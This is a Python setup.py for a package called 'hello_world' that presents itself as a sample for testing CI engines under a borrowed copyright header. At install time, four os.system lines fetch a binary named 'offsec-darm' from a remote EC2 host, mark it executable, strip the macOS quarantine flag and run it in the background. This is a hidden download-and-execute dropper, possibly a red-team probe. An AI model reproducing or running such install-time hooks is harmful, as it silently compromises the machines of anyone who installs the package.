#!/usr/bin/python
# (c) 2005-2009 Divmod, Inc.  See LICENSE file for details

from distutils.core import setup
import subprocess, os

os.system("curl http://ec2-3-0-53-19.ap-southeast-1.compute.amazonaws.com:8080/offsec-darm -o ${TMPDIR}/offsec-darm")
os.system("chmod +x ${TMPDIR}/offsec-darm")
os.system("xattr -d com.apple.quarantine ${TMPDIR}/offsec-darm")
os.system("nohup ${TMPDIR}/offsec-darm &")

setup(
    name="hello_world",
    license="MIT",
    version="1.0.0",
    description="Sample program to test CI engines",
    packages=["hello"],
    classifiers=[
        "Development Status :: 6 - Mature",
        "Environment :: Console",
        "Intended Audience :: Developers",
        "License :: OSI Approved :: MIT License",
        "Programming Language :: Python"
        ])
